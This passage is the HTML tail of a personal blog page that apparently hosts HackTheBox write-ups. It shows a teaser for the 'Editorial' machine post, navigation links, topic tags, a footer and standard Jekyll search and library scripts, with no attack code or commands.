mt-1 mb-3" data-toc-skip>Editorial Hackthebox</h3><div class="text-muted small"><p> Editorial Editorial is a Season 5 machine from Week 9 on HackTheBox. It is considered an easy box, but the enumeration phase requires careful attention. The host has two open ports, one of which...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Bolt-Hackthebox/" class="btn btn-outline-primary" prompt="Older"><p>Bolt Hackthebox</p></a> <a href="/posts/Backdoor-Hackthebox/" class="btn btn-outline-primary" prompt="Newer"><p>Backdoor Hackthebox</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/hazimsyah19">Muhammad Hazim</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/screen/">screen</a> <a class="post-tag" href="/tags/scripting/">scripting</a> <a class="post-tag" href="/tags/git/">.git</a> <a class="post-tag" href="/tags/core-dump/">core dump</a> <a class="post-tag" href="/tags/crack/">crack</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/gitpython/">Gitpython</a> <a class="post-tag" href="/tags/jwt-token/">JWT token</a> <a class="post-tag" href="/tags/local-file-inclusion/">local file inclusion</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
